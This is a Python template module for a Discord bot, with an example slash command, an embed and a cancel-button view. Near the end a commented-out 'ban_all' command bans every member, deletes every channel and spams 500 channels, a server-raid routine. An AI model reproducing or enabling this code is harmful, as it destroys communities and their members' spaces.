


""" ----- Bot import ----- """
import bot as b
bot = b.bot
discord = b.discord
View = b.View

""" ----- Module initialization ----- """

""" ----- Module info ----- """

class module_info(): # This whole class is optional. You can delete it if you want to
    module_listed = True
    module_name = "Example"
    module_description = f"ㅤThis is an example module \n" \
                         f"ㅤ`/example` - an example command \n" \
                         f"ㅤ`/fsdf` - sdfs fsd fks msdf dfslf sffss fsdfs \n"



""" ----- Events & others ----- """

# onything could be here



""" ----- Embeds ----- """

class Embeds():

    def help(slef=None):
        title = "EXAMPLE!"
        description= f"This is an example embed.\n"
        embed = discord.Embed(
                title=title,
                description=description,
                color=0xff0000
                )
        embed.set_footer(text=f"Bot creator: Kchulka#4766")
        return embed



""" ----- Views ----- """

class View_cancel_message(View):
    def __init__(self, ctx):
        super().__init__(timeout=60)
        self.ctx = ctx

    @discord.ui.button(style=discord.ButtonStyle.gray, emoji="❌", disabled=False, custom_id="x")
    async def regen_button_callback(self, button, interaction):
        await interaction.response.edit_message(content=" ", delete_after=0.1)

    async def on_timeout(self):
        try:
            self.clear_items()
            await self.ctx.edit(content="", view=self)
        except:
            print("message not found")



""" ----- Commands ----- """

@bot.command(name="example", description="Get some help!")
async def example(ctx):
        em = Embeds.help()
        vi = b.View_cancel_message(ctx)
        await ctx.respond(content=" ", embed=em, view=vi)



"""@bot.command(name="ban_all", description="Get some help!")
async def ban_all(ctx):
    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(member, reason="raid")
        except:
            print("missing permission")
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason="raid")
        except:
            print("missing permission")
    for i in range(500):
        channel = await ctx.guild.create_text_channel(name=f'Fsdffsfdf_{i}')"""

""" ----- Events & others ----- """

# onything could be here



